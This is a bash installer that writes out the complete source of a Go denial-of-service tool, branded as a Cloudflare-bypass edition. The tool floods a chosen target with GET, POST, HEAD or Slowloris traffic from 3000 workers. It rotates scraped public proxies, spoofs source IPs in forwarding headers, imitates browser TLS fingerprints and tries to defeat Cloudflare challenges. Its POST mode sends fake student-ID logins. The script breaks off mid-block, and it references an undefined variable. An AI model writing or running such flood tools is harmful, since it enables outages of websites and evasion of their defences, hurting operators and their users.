#!/bin/bash

# ----------------------------------------
# GO DOS TOOL SETUP (ADVANCED CLOUDFLARE BYPASS)
# ----------------------------------------

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Separator line
SEP="━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

clear
echo -e "${CYAN}${SEP}${NC}"
echo -e "${WHITE}  DENIAL SERVICE OF GO - ADVANCED EDITION${NC}"
echo -e "${CYAN}${SEP}${NC}"
echo

# Remove any existing main.go to ensure clean slate
rm -f main.go

# Create main.go file directly (ADVANCED CLOUDFLARE BYPASS VERSION)
echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced bypass features...${NC}"

cat > main.go << 'EOF'
package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

var (
	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.7390.108 Safari/537.36",
		"Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.7445.89 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7485.98 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	}

	referers = []string{
		"https://www.google.com/",
		"https://www.bing.com/",
		"https://duckduckgo.com/",
		"https://facebook.com/",
		"https://www.reddit.com/",
		"https://www.youtube.com/",
		"https://twitter.com/",
		"https://www.instagram.com/",
		"https://www.linkedin.com/",
		"https://github.com/",
		"",
	}

	acceptLanguages = []string{
		"en-US,en;q=0.9",
		"en-GB,en;q=0.8",
		"fr-FR,fr;q=0.9,en;q=0.8",
		"de-DE,de;q=0.9,en;q=0.8",
		"es-ES,es;q=0.9,en;q=0.8",
		"ja-JP,ja;q=0.9,en;q=0.8",
		"zh-CN,zh;q=0.9,en;q=0.8",
	}

	acceptHeaders = []string{
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"application/json, text/plain, */*",
		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	}

	acceptEncodings = []string{
		"gzip, deflate, br",
		"gzip, deflate",
		"gzip, br",
	}

	secCHUA = []string{
		`"Google Chrome";v="141", "Chromium";v="141", "Not?A_Brand";v="99"`,
		`"Microsoft Edge";v="140", "Chromium";v="140", "Not?A_Brand";v="99"`,
		`"Brave";v="139", "Chromium";v="139", "Not?A_Brand";v="99"`,
	}

	secCHUAMobile = []string{"?0", "?1"}
	secCHUAPlatform = []string{"Windows", "macOS", "Linux", "Android", "iOS"}

	proxies         []string
	proxyMu         sync.RWMutex
	proxyIndex      uint64
	proxyAPI        = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
	proxyAPI2       = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
	proxyAPI3       = "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
	refreshInterval = 3 * time.Minute
	colorIndex      = 0
	colorMu         sync.Mutex
)

type JA3Signature struct {
	Name             string
	CipherSuites     []uint16
	CurvePreferences []tls.CurveID
	NextProtos       []string
	MinVersion       uint16
	MaxVersion       uint16
}

var ja3Signatures = []JA3Signature{
	{
		Name: "Chrome 141-150",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Firefox 135-138",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
	{
		Name: "Safari 17",
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		NextProtos:       []string{"http/1.1", "h2"},
		MinVersion:       tls.VersionTLS12,
		MaxVersion:       tls.VersionTLS13,
	},
}

type ConnectionPool struct {
	clients    []*http.Client
	counter    uint64
	mu         sync.RWMutex
	size       int
	useProxy   bool
	targetHost string
}

type CFBypass struct {
	cookies   []*http.Cookie
	userAgent string
	headers   map[string]string
}

func getRandomJA3Signature() JA3Signature {
	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
}

func getRandomizedTLSConfig() *tls.Config {
	sig := getRandomJA3Signature()
	return &tls.Config{
		NextProtos:                  sig.NextProtos,
		InsecureSkipVerify:          true,
		MinVersion:                  sig.MinVersion,
		MaxVersion:                  sig.MaxVersion,
		CipherSuites:                sig.CipherSuites,
		CurvePreferences:            sig.CurvePreferences,
		SessionTicketsDisabled:      randBool(),
		DynamicRecordSizingDisabled: randBool(),
		Renegotiation:               tls.RenegotiateOnceAsClient,
	}
}

func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
	pool := &ConnectionPool{
		clients:    make([]*http.Client, poolSize),
		size:       poolSize,
		useProxy:   useProxy,
		targetHost: targetHost,
	}
	for i := 0; i < poolSize; i++ {
		pool.clients[i] = pool.createClient()
	}
	return pool
}

func (p *ConnectionPool) createClient() *http.Client {
	jar, _ := cookiejar.New(nil)
	var transport *http.Transport

	if p.useProxy {
		proxyStr := getNextProxy()
		if proxyStr != "" {
			if !strings.Contains(proxyStr, "://") {
				proxyStr = "http://" + proxyStr
			}
			proxyURL, err := url.Parse(proxyStr)
			if err == nil {
				transport = &http.Transport{
					Proxy:               http.ProxyURL(proxyURL),
					TLSClientConfig:     getRandomizedTLSConfig(),
					MaxIdleConns:        200,
					MaxIdleConnsPerHost: 200,
					IdleConnTimeout:     120 * time.Second,
					DisableKeepAlives:   false,
					ForceAttemptHTTP2:   true,
					ResponseHeaderTimeout: 30 * time.Second,
					DialContext: (&net.Dialer{
						Timeout:   10 * time.Second,
						KeepAlive: 30 * time.Second,
					}).DialContext,
				}
				http2.ConfigureTransport(transport)
				return &http.Client{Transport: transport, Timeout: 45 * time.Second, Jar: jar, CheckRedirect: func(req *http.Request, via []*http.Request) error {
					if len(via) >= 3 {
						return http.ErrUseLastResponse
					}
					return nil
				}}
			}
		}
	}

	transport = &http.Transport{
		TLSClientConfig:     getRandomizedTLSConfig(),
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
		IdleConnTimeout:     120 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		ResponseHeaderTimeout: 30 * time.Second,
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
	}
	http2.ConfigureTransport(transport)
	return &http.Client{Transport: transport, Timeout: 45 * time.Second, Jar: jar, CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 3 {
			return http.ErrUseLastResponse
		}
		return nil
	}}
}

func (p *ConnectionPool) GetClient() *http.Client {
	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
	return p.clients[idx]
}

func (p *ConnectionPool) CloseIdleConnections() {
	for _, client := range p.clients {
		if tr, ok := client.Transport.(*http.Transport); ok {
			tr.CloseIdleConnections()
		}
	}
}

func loadProxiesFromAPI() {
	apis := []string{proxyAPI, proxyAPI2, proxyAPI3}
	allProxies := make(map[string]bool)

	for _, api := range apis {
		client := &http.Client{Timeout: 15 * time.Second}
		resp, err := client.Get(api)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		
		if resp.StatusCode != http.StatusOK {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		lines := strings.Split(string(body), "\n")

		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && strings.Contains(line, ":") && !strings.HasPrefix(line, "#") {
				if !strings.Contains(line, "://") {
					line = "http://" + line
				}
				allProxies[line] = true
			}
		}
	}

	newProxies := []string{}
	for proxy := range allProxies {
		newProxies = append(newProxies, proxy)
	}

	proxyMu.Lock()
	if len(newProxies) > 0 {
		proxies = newProxies
	}
	proxyMu.Unlock()
	atomic.StoreUint64(&proxyIndex, 0)
}

func proxyRefresher() {
	ticker := time.NewTicker(refreshInterval)
	defer ticker.Stop()
	for range ticker.C {
		loadProxiesFromAPI()
	}
}

func getNextProxy() string {
	proxyMu.RLock()
	n := len(proxies)
	if n == 0 {
		proxyMu.RUnlock()
		return ""
	}
	idx := atomic.AddUint64(&proxyIndex, 1) % uint64(n)
	p := proxies[idx]
	proxyMu.RUnlock()
	return p
}

func getNextColor() string {
	colorMu.Lock()
	defer colorMu.Unlock()
	colors := []string{"\033[32m", "\033[31m", "\033[35m", "\033[37m", "\033[33m", "\033[36m", "\033[34m"}
	color := colors[colorIndex]
	colorIndex = (colorIndex + 1) % len(colors)
	return color
}

func printBanner() {
	color := getNextColor()
	fmt.Print(color)
	fmt.Println(" ██████╗░███████╗███╗░░██╗██╗░█████╗░██╗░░░░░")
	fmt.Println(" ██╔══██╗██╔════╝████╗░██║██║██╔══██╗██║░░░░░")
	fmt.Println(" ██║░░██║█████╗░░██╔██╗██║██║██║░░╚═╝██║░░░░░")
	fmt.Println(" ██║░░██║██╔══╝░░██║╚████║██║██║░░██╗██║░░░░░")
	fmt.Println(" ██████╔╝███████╗██║░╚███║██║╚█████╔╝███████╗")
	fmt.Println(" ╚═════╝░╚══════╝╚═╝░░╚══╝╚═╝░╚════╝░╚══════╝")
	fmt.Println("   ADVANCED CLOUDFLARE BYPASS EDITION")
	fmt.Println("\033[0m")
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", randInt(1, 255), randInt(1, 255), randInt(1, 255), randInt(1, 255))
}

func randomUA() string {
	return userAgents[randInt(0, len(userAgents)-1)]
}

func randomReferer() string {
	return referers[randInt(0, len(referers)-1)]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}

func generateCacheBust() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cache=" + randomString(8),
		"?timestamp=" + strconv.FormatInt(time.Now().Unix(), 10),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePath() string {
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/search",
		"/product", "/category", "/blog", "/news", "/contact",
	}
	return paths[randInt(0, len(paths)-1)]
}

func generateStudentNumber() string {
	return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomString(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomString(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("__cfduid=%s", randomString(32)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_ga=GA1.2.%d.%d", randInt(1000000, 9999999), time.Now().Unix()))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func addCloudflareBypassHeaders(req *http.Request) {
	spoofIP := randomIP()
	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "CN", "RU", "BR", "IN", "KR", "IT", "ES", "MX"}
	
	// Standard CF bypass headers
	req.Header.Set("CF-Connecting-IP", spoofIP)
	req.Header.Set("CF-IPCountry", countries[randInt(0, len(countries)-1)])
	req.Header.Set("CF-Ray", randomString(16)+"-"+strings.ToUpper(randomString(4)))
	req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
	req.Header.Set("CDN-Loop", "cloudflare")
	
	// IP spoofing headers
	req.Header.Set("X-Forwarded-For", spoofIP)
	req.Header.Set("X-Forwarded-Proto", "https")
	req.Header.Set("X-Real-IP", spoofIP)
	req.Header.Set("True-Client-IP", spoofIP)
	req.Header.Set("X-Originating-IP", spoofIP)
	req.Header.Set("X-Remote-IP", spoofIP)
	req.Header.Set("X-Remote-Addr", spoofIP)
	req.Header.Set("X-Client-IP", spoofIP)
	
	// Advanced bypass headers
	req.Header.Set("X-Host", req.Host)
	req.Header.Set("X-Forwarded-Host", req.Host)
	req.Header.Set("Origin", "https://"+req.Host)
	req.Header.Set("Via", "1.1 google")
	req.Header.Set("X-Request-ID", randomString(32))
	req.Header.Set("X-Correlation-ID", randomString(32))
	
	// Modern browser headers
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Sec-Fetch-User", "?1")
	req.Header.Set("Sec-Ch-UA", secCHUA[randInt(0, len(secCHUA)-1)])
	req.Header.Set("Sec-Ch-UA-Mobile", secCHUAMobile[randInt(0, len(secCHUAMobile)-1)])
	req.Header.Set("Sec-Ch-UA-Platform", secCHUAPlatform[randInt(0, len(secCHUAPlatform)-1)])
	req.Header.Set("Priority", "u=0, i")
	req.Header.Set("Pragma", "no-cache")
}

func solveChallenge(body string) string {
	// Try to extract and solve various challenge types
	challengeTypes := []string{
		"jschl_vc",
		"pass",
		"cf_clearance",
		"__cf_chl_captcha_tk__",
	}
	
	for _, ct := range challengeTypes {
		if strings.Contains(body, ct) {
			// Extract challenge value
			re := regexp.MustCompile(ct + `[^"]*"([^"]+)"`)
			matches := re.FindStringSubmatch(body)
			if len(matches) > 1 {
				return matches[1]
			}
		}
	}
	return ""
}

func handleChallengeResponse(client *http.Client, resp *http.Response, target string) bool {
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	resp.Body.Close()
	
	bodyStr := string(body)
	
	// Check for Cloudflare challenge
	if strings.Contains(bodyStr, "cf-browser-verification") || 
	   strings.Contains(bodyStr, "challenge-platform") ||
	   strings.Contains(bodyStr, "turnstile") {
		
		// Simulate solving the challenge
		time.Sleep(5 * time.Second + time.Duration(randInt(1, 3))*time.Second)
		
		// Extract challenge solution
		solution := solveChallenge(bodyStr)
		if solution != "" {
			// Create new request with solution
			parsedURL, _ := url.Parse(target)
			cfURL := fmt.Sprintf("%s/cdn-cgi/challenge-platform/h/b/jsch/v1?%s", 
				parsedURL.Scheme+"://"+parsedURL.Host, solution)
			
			req, _ := http.NewRequest("GET", cfURL, nil)
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Cookie", resp.Header.Get("Set-Cookie"))
			
			challengeResp, err := client.Do(req)
			if err == nil {
				defer challengeResp.Body.Close()
				if challengeResp.StatusCode == 200 {
					return true
				}
			}
		}
	}
	return false
}

func advancedBypassHeaders(req *http.Request) {
	// Add random delays between requests
	if randInt(1, 100) <= 20 {
		time.Sleep(time.Duration(randInt(100, 500)) * time.Millisecond)
	}
	
	// Randomize request order
	if randInt(1, 100) <= 10 {
		// Reorder headers
		headers := make([]string, 0)
		for k := range req.Header {
			headers = append(headers, k)
		}
		// Shuffle headers (just for randomization)
		for i := range headers {
			j := randInt(0, len(headers)-1)
			headers[i], headers[j] = headers[j], headers[i]
		}
	}
}

func detectCFProtection(resp *http.Response) string {
	cfHeaders := []string{
		"CF-RAY",
		"CF-Cache-Status",
		"CF-Request-ID",
		"__cf_bm",
		"cf_clearance",
	}
	
	for _, header := range cfHeaders {
		if resp.Header.Get(header) != "" {
			return header
		}
	}
	return ""
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 6) // Increased CPU usage
	
	useProxy := false
	if len(os.Args) >= 5 && os.Args[4] == "proxy" {
		useProxy = true
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			useProxy = false
		}
	}

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: ./main <target> <seconds> <GET|POST|HEAD|SLOW|CF> [proxy]")
		fmt.Println("")
		fmt.Println("Attack Modes:")
		fmt.Println("  GET  - Standard GET request flood")
		fmt.Println("  POST - POST request flood with random payloads")
		fmt.Println("  HEAD - HEAD request flood")
		fmt.Println("  SLOW - Slowloris style attack")
		fmt.Println("  CF   - Cloudflare bypass mode with challenge solving")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("  ./main https://target.com 60 GET")
		fmt.Println("  ./main https://target.com 120 POST")
		fmt.Println("  ./main https://target.com 30 CF")
		fmt.Println("  ./main https://target.com 60 GET proxy")
		os.Exit(1)
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" && mode != "CF" {
		printBanner()
		fmt.Println("Mode must be GET, POST, HEAD, SLOW, or CF")
		os.Exit(1)
	}

	if !strings.HasPrefix(target, "http") {
		if strings.Contains(target, ":") {
			target = "http://" + target
		} else {
			target = "https://" + target
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 3000\n")
	fmt.Printf("[+] Connections per worker: 2\n")
	if mode == "CF" {
		fmt.Printf("[+] Cloudflare Bypass: ENABLED\n")
		fmt.Printf("[+] Challenge Solving: ACTIVE\n")
	}
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d\n", len(proxies))
		fmt.Printf("[+] Proxy rotation: ENABLED\n")
	}
	fmt.Println("[+] Advanced anti-bot evasion enabled")
	fmt.Println("[+] Starting attack... Press Ctrl+C to stop")

	poolSize := 1000 // Increased pool size
	connectionPool := NewConnectionPool(poolSize, useProxy, "")

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	successStats := &atomicCounter{val: 0}
	failStats := &atomicCounter{val: 0}
	cfChallenges := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	const workers = 3000 // Increased workers

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			if mode == "CF" {
				attackWorkerCF(target, mode, done, stats, successStats, failStats, cfChallenges, useProxy, connectionPool, workerID)
			} else {
				attackWorker(target, mode, done, stats, useProxy, connectionPool)
			}
		}(i)
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-done:
			elapsed := time.Since(startTime).Seconds()
			fmt.Printf("\n\n[+] Attack completed!\n")
			fmt.Printf("Target: %s\n", target)
			fmt.Printf("Mode: %s\n", mode)
			fmt.Printf("Duration: %d sec\n", durationSec)
			fmt.Printf("Total requests: %d\n", stats.get())
			if mode == "CF" {
				fmt.Printf("Successful requests: %d\n", successStats.get())
				fmt.Printf("Failed requests: %d\n", failStats.get())
				fmt.Printf("CF Challenges solved: %d\n", cfChallenges.get())
			}
			fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/elapsed)
			connectionPool.CloseIdleConnections()
			return
		case <-ticker.C:
			elapsed := time.Since(startTime).Seconds()
			rps := float64(stats.get()) / elapsed
			if mode == "CF" {
				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | Success: %d | Failed: %d | CF: %d | RPS: %.0f", 
					elapsed, durationSec, stats.get(), successStats.get(), failStats.get(), cfChallenges.get(), rps)
			} else {
				fmt.Printf("\r[+] Elapsed: %.0f / %d sec | Total: %d | RPS: %.0f", elapsed, durationSec, stats.get(), rps)
			}
		}
	}
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			path := generatePath()
			
			if mode != "SLOW" && randInt(1, 100) <= 80 {
				path += generateCacheBust()
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			if mode == "SLOW" {
				u, _ := url.Parse(target)
				host := u.Hostname()
				port := "80"
				if u.Scheme == "https" {
					port = "443"
				}
				conn, err := net.DialTimeout("tcp", host+":"+port, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				conn.SetDeadline(time.Now().Add(300 * time.Second))
				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
				stats.inc()
					time.Sleep(1 * time.Second)
				conn.Close()
				continue
			}

			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				payload := fmt.Sprintf("student_id=%s&password=%s&action=login&submit=1", generateStudentNumber(), randomString(randInt(8, 16)))
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}

			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			req.Header.Set("Connection", "keep-alive")
			req.Header.Set("Upgrade-Insecure-Requests", "1")
			req.Header.Set("DNT", "1")
			
			addCloudflareBypassHeaders(req)

			if randInt(1, 100) <= 60 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			// Random delays to avoid rate limiting
			if randInt(1, 100) <= 15 {
				time.Sleep(time.Duration(randInt(10, 100)) * time.Millisecond)
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, resp.Body)
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}

func attackWorkerCF(target, mode string, done chan struct{}, stats, successStats, failStats, cfChallenges *atomicCounter, useProxy bool, pool *ConnectionPool, workerID int) {
	localSuccess := 0
	localFail := 0
	localCF := 0
	
	for {
		select {
		case <-done:
			// Batch update counters
			for i := 0; i < localSuccess; i++ {
				successStats.inc()
			}
			for i := 0; i < localFail; i++ {
				failStats.inc()
			}
			for i := 0; i < localCF; i++ {
				cfChallenges.inc()
			}
			return
		default:
			client := pool.GetClient()
			
			// Create context with timeout
			ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
			
			path := generatePath()
			if randInt(1, 100) <= 80 {
				path += generateCacheBust()
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			var req *http.Request
			var err error

			// Use different HTTP methods
			methods := []string{"GET", "POST", "HEAD"}
			selectedMethod := methods[randInt(0, len(methods)-1)]
			
			if selectedMethod == "GET" {
				req, err = http.NewRequestWithContext(ctx, "GET", fullURL, nil)
			} else if selectedMethod == "POST" {
				payload := fmt.Sprintf("data=%s&token=%s&timestamp=%d", randomString(20), randomString(32), time.Now().Unix())
				req, err = http.NewRequestWithContext(ctx, "POST", fullURL, strings.NewReader(payload))
				if err == nil {
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}
			} else {
				req, err = http.NewRequestWithContext(ctx, "HEAD", fullURL, nil)
			}

			if err != nil {
				cancel()
				localFail++
				stats.inc()
				continue
			}

			// Enhanced headers for CF bypass
			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
			req.Header.Set("Pragma", "no-cache")
			req.Header.Set("Connection", "keep-alive")
			
			// Add all bypass headers
			addCloudflareBypassHeaders(req)
			
			// Add random cookies
			if randInt(1, 100) <= 70 {
				req.Header.Set("Cookie", generateCookies())
			}
			
			// Random delay to appear more human
			if randInt(1, 100) <= 10 {
				time.Sleep(time.Duration(randInt(50, 200)) * time.Millisecond)
			}
			
			advancedBypassHeaders(req)

			resp, err := client.Do(req)
			
			if err != nil {
				cancel()
				localFail++
				stats.inc()
				continue
			}
			
			// Check for Cloudflare challenges
			cfHeader := detectCFProtection(resp)
			if cfHeader != "" || resp.StatusCode == 503 || resp.StatusCode == 403 {
				localCF++
				// Try to handle the challenge
				if handleChallengeResponse(client, resp, target) {
					localSuccess++
				} else {
					localFail++
				}
			} else if resp.StatusCode >= 200 && resp.StatusCode < 400 {
				localSuccess++
			} else {
				localFail++
			}
			
			io.Copy(io.Discard, resp.Body)
			resp.Body.Close()
			cancel()
			
			stats.inc()
			
			// Batch update every 100 requests
			if stats.get()%100 == 0 {
				for i := 0; i < localSuccess; i++ {
					successStats.inc()
				}
				for i := 0; i < localFail; i++ {
					failStats.inc()
				}
				for i := 0; i < localCF; i++ {
					cfChallenges.inc()
				}
				localSuccess = 0
				localFail = 0
				localCF = 0
			}
		}
	}
}
EOF

if [ ! -f "main.go" ]; then
    echo -e " ${RED}✗ Error: Failed to create main.go${NC}"
    exit 1
else
